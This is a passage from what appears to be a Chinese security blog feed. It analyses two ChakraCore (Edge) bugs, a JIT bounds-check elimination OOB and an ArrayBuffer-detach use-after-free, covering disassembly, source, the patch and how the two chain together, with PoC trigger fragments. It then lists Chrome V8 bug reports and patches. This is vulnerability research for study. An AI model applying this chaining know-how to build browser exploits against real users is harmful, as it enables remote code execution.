43,</span><br><span class="line">    TypeIds_Uint8ClampedArray = 44,</span><br><span class="line">    TypeIds_Int16Array = 45,</span><br><span class="line">    TypeIds_Uint16Array = 46,</span><br><span class="line">    TypeIds_Int32Array = 47,</span><br><span class="line">    TypeIds_Uint32Array = 48,//----&gt;0x30</span><br><span class="line">    TypeIds_Float32Array = 49,</span><br><span class="line">    TypeIds_Float64Array = 50,</span><br><span class="line">    TypeIds_TypedArraySCAMax = TypeIds_Float64Array, // Max SCA supported TypedArray TypeId</span><br><span class="line">    TypeIds_Int64Array = 51,</span><br><span class="line">    TypeIds_Uint64Array = 52,</span><br><span class="line">    TypeIds_CharArray = 53,</span><br><span class="line">    TypeIds_BoolArray = 54,</span><br><span class="line"></span><br><span class="line">00007ffa`d30d8906 7e05 jle chakra!Js::ArrayBuffer::ClearParentsLength+0x41 (00007ffa`d30d890d) Branch----&gt;跳转</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x41:</span><br><span class="line">00007ffa`d30d890d 83612000 and dword ptr [rcx+20h],0-----&gt;将长度设置为0，但是未将View对ArrayBuffer Object对象申请的缓冲区的引用置NULL。</span><br><span class="line"></span><br><span class="line">chakra!Js::ArrayBuffer::ClearParentsLength+0x45:</span><br><span class="line">00007ffa`d30d8911 4883c428 add rsp,28h</span><br><span class="line">00007ffa`d30d8915 c3 ret</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120909.jpg" alt=""><br>将长度设置为0</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120924.jpg" alt=""></p><p>对应到ClearParentsLength源码中<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ArrayBuffer::ClearParentsLength(ArrayBufferParent* pare nt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (JavascriptOperators::GetTypeId(parent))</span><br><span class="line">    &#123;</span><br><span class="line">                            ...</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint32Array:</span><br><span class="line">                           ...</span><br><span class="line">            TypedArrayBase::FromVar(parent)-&gt;length = <span class="number">0</span>;-------------&gt;<span class="built_in">free</span> but no <span class="built_in">set</span> <span class="literal">NULL</span></span><br></pre></td></tr></table></figure></p><p><strong>注意此时其实ArrayBuffer Object所分配的buffer已经被释放了，所以可以被我们重新分配出来，占位。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-25-120951.jpg" alt=""></p><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p><a href="https://github.com/Microsoft/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031</a><br>patch就是将未置为NULL的指针置为NULL了<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+ <span class="keyword">void</span> TypedArrayBase::ClearLengthAndBufferOnDetach()</span><br><span class="line">+ &#123;</span><br><span class="line">+ AssertMsg(IsDetachedBuffer(), <span class="string">"Array buffer should be detached if we're calling this method"</span>);</span><br><span class="line">+</span><br><span class="line">+ <span class="keyword">this</span>-&gt;length = <span class="number">0</span>;</span><br><span class="line">+ <span class="keyword">this</span>-&gt;buffer = <span class="literal">nullptr</span>;</span><br><span class="line">+ &#125;</span><br><span class="line">+</span><br></pre></td></tr></table></figure></p><h3 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h3><p>从patch里找一个case<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TypeIds_Int32Array:</span><br><span class="line">                <span class="keyword">if</span> (Int32VirtualArray::Is(parent))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (VirtualTableInfo&lt;Int32VirtualArray&gt;::HasVirtualTable(parent))</span><br><span class="line">                    &#123;</span><br><span class="line">                        VirtualTableInfo&lt;Int32Array&gt;::SetVirtualTable(parent);</span><br><span class="line">                    &#125;</span><br><span class="line">...</span><br><span class="line">                &#125;</span><br><span class="line">                TypedArrayBase::FromVar(parent)-&gt;ClearLengthAndBufferOnDetach();</span><br><span class="line">                <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>注意到patch里有这样的代码，目的是什么呢？<br>SetVirtualTable将虚表由Int32VirtualArray修改为Int32Array。<br>而我们知道0234触发的条件是如下代码，注意<code>IsLikelyOptimizedVirtualTypedArray</code><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">        ....</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>这个Patch的目的仍然和0234有关，将漏洞联系起来看。<br>这样去修改虚表我测试了一下，暂时没找到什么可能引入的安全问题。</p><h2 id="开发者的Assumption"><a href="#开发者的Assumption" class="headerlink" title="开发者的Assumption"></a>开发者的Assumption</h2><p>即使存在对free了的内存的引用，由于MemGC，并不会直接造成UAF，因为不可占位。而且将length置为0，就不存在可以继续操作这个缓冲区的的可能。</p><ol><li>在开发者的假设里，MemGC对引用进行扫描，从而不释放仍有引用指向的缓冲区，可以很好的缓解UAF，<strong>但是通过控制ArrayBuffer的长度，我们可以让它使用VirtualAlloc分配，而不是GC</strong>。于是就没有上述的检查。</li><li>其实不把指针置为NULL这种写法理论上并不一定能造成影响，因为我们已经把length置为0了，理论上说我们已经无法控制分配的缓冲区了，无法读写。<br><strong>但是由于利用0234，可以在JIT时消除上界下界，于是我们就有了一个越界读写，可以打破length等于0给我们造成的限制。</strong></li></ol><h2 id="Pattern"><a href="#Pattern" class="headerlink" title="Pattern"></a>Pattern</h2><p>这个漏洞的发现是由0234逐次引入的，要找到一个UAF，首先要定位到一个<strong>可控对象的释放操作</strong>，这也是我不熟知的一个点。<br>还有就是在其中找到直接将length置为0，就“不可操作”了，这种释放方式。<br>从该函数的其他case可以看到dataview也是这么操作的，删除Length但是不置NULL，但是由于无法触发JIT的消除边界优化，所以更难以利用了。（也被一起补了）<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TypeIds_DataView:</span><br><span class="line">    DataView::FromVar(parent)-&gt;length = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="0234（OOB）触发的条件（由有限到推广）"><a href="#0234（OOB）触发的条件（由有限到推广）" class="headerlink" title="0234（OOB）触发的条件（由有限到推广）"></a>0234（OOB）触发的条件（由有限到推广）</h3><table><thead><tr><th>有限</th><th style="text-align:center">推广</th></tr></thead><tbody><tr><td>ArrayBuffer(0x10000)</td><td style="text-align:center">需要一个大于0x10000大小的buffer，这样才会让TypedArray的虚表类型是VirtualArray，从而触发JIT优化</td></tr><tr><td>Uint32Array(buffer)</td><td style="text-align:center"><strong>单个element size大于1字节的VirtualTypedArray</strong>（即除了Uint8Array和Int8Array）</td></tr><tr><td>循环次数足够大，触发JIT优化（循环体内是对数组的赋值，在优化后去掉边界检查）</td><td style="text-align:center">循环次数足够大，触发JIT优化（循环体内是对数组的赋值，在优化后去掉边界检查）</td></tr></tbody></table><h3 id="0236（UAF）触发的条件（由有限到推广）"><a href="#0236（UAF）触发的条件（由有限到推广）" class="headerlink" title="0236（UAF）触发的条件（由有限到推广）"></a>0236（UAF）触发的条件（由有限到推广）</h3><table><thead><tr><th>有限</th><th style="text-align:center">推广</th></tr></thead><tbody><tr><td>ArrayBuffer(0x10000)</td><td style="text-align:center">需要一个大于0x10000大小的buffer，使得通过VirtualAlloc分配，从而绕过MemGC的引用计数，延迟释放，才能引发UAF</td></tr><tr><td>Uint32Array(buffer)</td><td style="text-align:center">ArrayBuffer的一个parent对象。detach之后在其中仍然保留一个指向缓冲区的引用，从而造成UAF，注意这里不仅TypedArray可以UAF，DateView也可以。但是DataView无法和0234结合使用，不满足IsLikelyOptimizedVirtualTypedArray</td></tr><tr><td>worker.postMessage(buffer,[buffer]);worker.terminate();</td><td style="text-align:center">进行Detach，触发UAF</td></tr></tbody></table><h3 id="交集"><a href="#交集" class="headerlink" title="交集"></a>交集</h3><p><strong>关于虚表的部分补充在上面patch第二部分。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer(<span class="number">0x10000</span>)</span><br><span class="line">Uint32Array(buffer)</span><br></pre></td></tr></table></figure><p>虽然PoC里这部分相同，但是目的却各不相同。<br>ArrayBuffer(0x10000)在0236的主要目的是绕过MemGC的UAF缓解机制</p><p>而在0234，目的则是由于通过VA分配，update虚表为VirtualArray，从而触发JIT优化。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (baseValueType.IsLikelyOptimizedVirtualTypedArray() &amp;&amp; !Js::IsSimd128LoadStore(instr-&gt;m_opcode) <span class="comment">/*Always extract bounds for SIMD */</span>)</span><br><span class="line"> &#123;</span><br><span class="line">        ....</span><br><span class="line">         eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">         canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>update虚表操作如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chakra!Js::TypedArray&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">0</span>&gt;::TypedArray&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">0</span>&gt;+<span class="number">0xd1</span>:</span><br><span class="line"><span class="number">00007f</span>fa`d2c50f21 e8c6f7ffff call chakra!VirtualTableInfo&lt;Js::TypedArray&lt;<span class="keyword">unsigned</span> <span class="keyword">int</span>,<span class="number">0</span>,<span class="number">1</span>&gt; &gt;::SetVirtualTable (<span class="number">00007f</span>fa`d2c506ec)</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-065614.jpg" alt=""><br>源码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> TypeName, <span class="keyword">bool</span> clamped, <span class="keyword">bool</span> virtualAllocated&gt;</span><br><span class="line">TypedArray&lt;TypeName, clamped, virtualAllocated&gt;::TypedArray(ArrayBufferBase* arrayBuffer, uint32 byteOffset, uint32 mappedLength, DynamicType* type) :</span><br><span class="line">    TypedArrayBase(arrayBuffer, byteOffset, mappedLength, <span class="keyword">sizeof</span>(TypeName), type)</span><br><span class="line">&#123;</span><br><span class="line">    AssertMsg(arrayBuffer-&gt;GetByteLength() &gt;= byteOffset, <span class="string">"invalid offset"</span>);</span><br><span class="line">    AssertMsg(mappedLength*<span class="keyword">sizeof</span>(TypeName)+byteOffset &lt;= arrayBuffer-&gt;GetByteLength(), <span class="string">"invalid length"</span>);</span><br><span class="line">    buffer = arrayBuffer-&gt;GetBuffer() + byteOffset;</span><br><span class="line">    <span class="keyword">if</span> (arrayBuffer-&gt;IsValidVirtualBufferLength(arrayBuffer-&gt;GetByteLength()) &amp;&amp;</span><br><span class="line">         (byteOffset == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">         (mappedLength == (arrayBuffer-&gt;GetByteLength() / <span class="keyword">sizeof</span>(TypeName)))</span><br><span class="line">       )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// update the vtable</span></span><br><span class="line">        <span class="keyword">switch</span> (type-&gt;GetTypeId())</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int8Array:</span><br><span class="line">            VirtualTableInfo&lt;Int8VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint8Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint8VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint8ClampedArray:</span><br><span class="line">            VirtualTableInfo&lt;Uint8ClampedVirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int16Array:</span><br><span class="line">            VirtualTableInfo&lt;Int16VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint16Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint16VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Int32Array:</span><br><span class="line">            VirtualTableInfo&lt;Int32VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TypeIds_Uint32Array:</span><br><span class="line">            VirtualTableInfo&lt;Uint32VirtualArray&gt;::SetVirtualTable(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>而Uint32对于0234是为了OOB，对于0236是保留一个指向缓冲区的引用，UAF。</p><p>但是0236的PoC单独使用是没有意义的，因为ClearLength将TypedArray的length清零，无法控制内存。<br>但是通过0234的JIT优化，去掉了边界检查，从而可以修改缓冲区，发挥UAF的威力。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>我觉得必要条件和充分条件是很有趣和有用的想法。<br>这其中还有一种对抗与脆弱性的思维在里面，一个有价值的漏洞引入的很可能不是一个地方有问题，而是类似实现的地方都有问题，通过这个poc可以触发，patch之后能不能找到类似的实现或者因为没有补全找到更多触发，甚至由于patch的不好引发新的安全问题，都有可能。<br>除此之外，将漏洞联系起来看，而不是单纯的去看一个OOB或者单纯一个UAF，能够更深入的思考漏洞的本质，找到更多利用的想法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;h3 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="edge" scheme="http://eternalsakura13.com/tags/edge/"/>
    
  </entry>
  
  <entry>
    <title>Vulnerabilities from Chrome</title>
    <link href="http://eternalsakura13.com/2018/07/23/Vulnerabilities/"/>
    <id>http://eternalsakura13.com/2018/07/23/Vulnerabilities/</id>
    <published>2018-07-22T18:24:46.389Z</published>
    <updated>2018-10-22T14:25:51.721Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h1><h2 id="Bugs-715582"><a href="#Bugs-715582" class="headerlink" title="Bugs:715582"></a>Bugs:715582</h2><ul><li>Security: Out of bound read in FindSharedFunctionInfo (V8)<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=715582" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=715582</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/4e78b5a70c6443e3829b0bef10fd731062e27aa3" target="_blank" rel="noopener">https://github.com/v8/v8/commit/4e78b5a70c6443e3829b0bef10fd731062e27aa3</a></li><li>影响版本：<br>6.0.92及以下</li><li>note<br>和AST遍历访问有关，比较特别，mark一下</li></ul><h2 id="Bugs-732169"><a href="#Bugs-732169" class="headerlink" title="Bugs:732169"></a>Bugs:732169</h2><ul><li>Ill in v8::internal::TranslatedState::MaterializeCapturedObjectAt<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=732169" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=732169</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/f555a6922dd1b425ed845370cd01428b3ba46f93" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f555a6922dd1b425ed845370cd01428b3ba46f93</a></li><li>影响版本<br>6.1.131及以下</li></ul><h2 id="CVE-2017-5115-Bugs-744584"><a href="#CVE-2017-5115-Bugs-744584" class="headerlink" title="CVE-2017-5115/Bugs:744584"></a>CVE-2017-5115/Bugs:744584</h2><ul><li>Bugs in type inference when replacing EffectPhi with Phi<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=744584" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=744584</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a224eff455632df89377748421a23be47a5278e8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a224eff455632df89377748421a23be47a5278e8</a></li><li>影响版本<br>6.2.0及以下</li></ul><h2 id="Bugs-746946"><a href="#Bugs-746946" class="headerlink" title="Bugs:746946"></a>Bugs:746946</h2><ul><li>Security: Chrome Type Confusion leads to Code Execution<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=746946" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=746946</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a</a></li><li>note<br>这个洞我只是看到给了个exp，所以说记录一下，其实没什么可看的</li></ul><h2 id="Bugs-752149"><a href="#Bugs-752149" class="headerlink" title="Bugs:752149"></a>Bugs:752149</h2><ul><li>Security: Arbitrary bad cast in optimized Javascript code<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=752149" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=752149</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/1d92fd2edf771d4d5739dd473f8614af87f722f8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/1d92fd2edf771d4d5739dd473f8614af87f722f8</a></li><li>影响版本<br>6.2.170及以下</li></ul><h2 id="Bugs-757199"><a href="#Bugs-757199" class="headerlink" title="Bugs:757199"></a>Bugs:757199</h2><ul><li>DCHECK failure in result-&gt;owns_descriptors() in objects.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=757199" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=757199</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/8a7ce927a685d4007e02298881d85c7d5f273777" target="_blank" rel="noopener">https://github.com/v8/v8/commit/8a7ce927a685d4007e02298881d85c7d5f273777</a></li><li>影响版本<br>6.2.363及以下</li></ul><h2 id="Bugs-765433"><a href="#Bugs-765433" class="headerlink" title="Bugs:765433"></a>Bugs:765433</h2><ul><li>Security: V8 JIT escape analysis bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=765433" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=765433</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/40a9eabc44204c353dce4bec08e8bd87b3fc0cc7" target="_blank" rel="noopener">https://github.com/v8/v8/commit/40a9eabc44204c353dce4bec08e8bd87b3fc0cc7</a><br>这是我们从那以后完全重写的旧逃逸分析中的一个错误。<br>好消息是，这是通过新的逃逸分析来解决的，坏消息是旧的逃逸分析已经消失，因此无法修复其中的错误。唯一可靠的方法似乎是禁用6.1中的逃逸分析。</li></ul><h2 id="Bugs-762874"><a href="#Bugs-762874" class="headerlink" title="Bugs:762874"></a>Bugs:762874</h2><ul><li>Security: off by one in TurboFan range optimization for String.indexOf<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=762874" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=762874</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/b8f144ec4fd1cd808f0d883668f355498b56d7fa" target="_blank" rel="noopener">https://github.com/v8/v8/commit/b8f144ec4fd1cd808f0d883668f355498b56d7fa</a></li><li>影响版本<br>6.3.97及以下</li></ul><h2 id="Bugs-772420"><a href="#Bugs-772420" class="headerlink" title="Bugs:772420"></a>Bugs:772420</h2><ul><li>DCHECK failure in right_type()-&gt;Is(Type::PlainPrimitive()) in js-typed-lowering.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=772420" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=772420</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/3118f473950b4b707d78622053fc4934a2d3f13a</a></li><li>影响版本<br>6.4.32及以下</li></ul><h2 id="Bugs-776677"><a href="#Bugs-776677" class="headerlink" title="Bugs:776677"></a>Bugs:776677</h2><ul><li>Security: V8:Use After Free Leads to Remote Code Execution(有exp)<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=776677" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=776677</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/5f960dfc06a7c95af69e2b09f772b2280168469b" target="_blank" rel="noopener">https://github.com/v8/v8/commit/5f960dfc06a7c95af69e2b09f772b2280168469b</a></li><li>影响版本<br>6.4.91及以下</li></ul><h2 id="Bugs-784533"><a href="#Bugs-784533" class="headerlink" title="Bugs:784533"></a>Bugs:784533</h2><ul><li>DCHECK failure in IsTyped(node) in node-properties.h<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=784533" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=784533</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/ebe6d7a97f962c18595a2a1efaa93fa1c5ede604" target="_blank" rel="noopener">https://github.com/v8/v8/commit/ebe6d7a97f962c18595a2a1efaa93fa1c5ede604</a></li><li>影响版本<br>6.4.289及以下</li></ul><h2 id="Bugs-788539"><a href="#Bugs-788539" class="headerlink" title="Bugs:788539"></a>Bugs:788539</h2><ul><li>CHECK failure: frame_state-&gt;opcode() == IrOpcode::kFrameState || (node-&gt;opcode() == IrOpcode::k<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=788539" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=788539</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/904c3a1f091d3ff6f19451fced343392a5ec944a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/904c3a1f091d3ff6f19451fced343392a5ec944a</a></li><li>影响版本<br>6.4.376及以下</li></ul><h2 id="Bugs-787910"><a href="#Bugs-787910" class="headerlink" title="Bugs:787910"></a>Bugs:787910</h2><ul><li>Use-after-poison in parameter_count<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=787910" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=787910</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/0bc1b967f2b91779abf1f5b209ac1b4114dfe4c6" target="_blank" rel="noopener">https://github.com/v8/v8/commit/0bc1b967f2b91779abf1f5b209ac1b4114dfe4c6</a></li><li>影响版本<br>6.4.363及以下</li></ul><h2 id="Bugs-791245"><a href="#Bugs-791245" class="headerlink" title="Bugs:791245"></a>Bugs:791245</h2><ul><li>Security: V8: JIT: Simplified-lowererer IrOpcode::kStoreField, IrOpcode::kStoreElement optimization bug<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791245" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=791245</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/cc07ac73a460de3d933ebe7aebf0f55b741eb5cf" target="_blank" rel="noopener">https://github.com/v8/v8/commit/cc07ac73a460de3d933ebe7aebf0f55b741eb5cf</a></li><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8/+/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e%5E%21/#F0" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e%5E%21/#F0</a><br><a href="https://github.com/v8/v8/commit/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c22ca7f73ba92f22d0cd29b06bb2944a545a8d3e</a></li><li>影响版本<br>6.1.75-6.5.6</li></ul><h2 id="Bugs-791953"><a href="#Bugs-791953" class="headerlink" title="Bugs:791953"></a>Bugs:791953</h2><ul><li>CHECK failure: NumberToUint32 of kRepWord32 (Range(1, NUMBER)) cannot be changed to kRepTaggedS<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791953" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=791953</a></li><li>patch<br>还没找到</li></ul><h2 id="Bugs-794394"><a href="#Bugs-794394" class="headerlink" title="Bugs:794394"></a>Bugs:794394</h2><ul><li>Security: V8: JIT: JSBuiltinReducer::ReduceObjectCreate fails to ensure that the prototype is “null”<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794394" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794394</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a90503d8a9526f9a3e3df4e24e68c8aea1c74f14" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a90503d8a9526f9a3e3df4e24e68c8aea1c74f14</a></li><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/ff7063c7d5d8ad8eafcce3da59e65d7fe2b4f915%5E%21/#F2</a></li><li>影响版本<br>5.7.447-6.5.67</li></ul><h2 id="Bugs-794822"><a href="#Bugs-794822" class="headerlink" title="Bugs:794822"></a>Bugs:794822</h2><ul><li>Chrome: V8: JIT: Type confusion in GetSpecializationContext<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794822" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794822</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/649ab060c05bc40db696c74ca9ac95093ef9b433" target="_blank" rel="noopener">https://github.com/v8/v8/commit/649ab060c05bc40db696c74ca9ac95093ef9b433</a></li><li>影响版本<br>6.5.71及以下</li></ul><h2 id="Bugs-797596"><a href="#Bugs-797596" class="headerlink" title="Bugs:797596"></a>Bugs:797596</h2><ul><li>DCHECK failure in IrOpcode::kMerge == control-&gt;opcode() in node-properties.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=797596" target="_blank" 